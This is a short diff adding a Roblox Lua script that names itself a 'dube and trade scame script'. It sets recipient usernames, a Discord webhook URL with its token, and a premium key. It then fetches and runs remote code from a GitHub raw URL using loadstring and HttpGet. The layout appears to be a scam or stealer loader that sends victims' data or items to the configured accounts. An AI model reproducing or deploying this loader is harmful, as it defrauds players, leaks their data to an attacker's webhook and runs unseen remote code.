@@ -1,0 +1,10 @@
+UserName = "mega_power109"
+UserName2 = "mega_power109"
+Webhook = "https://discord.com/api/webhooks/1088203006631219220/XY6Uk5yC8JUny8Gxjswy7-7S94UuBzj5K-mvcVH5FYM_r4qU1fjBVSli_lhTjqonYxFz"
+_G.PremiumKey = "YJ5746BxCJvBAf5E"
+_G.ScriptName = "dube script"
+_G.FirstText = "hello in dube and trade scame script"
+_G.SecondText = "made by mega"
+_G.ThirdText = "welcome to script"
+_G.WaitingTime = 20
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
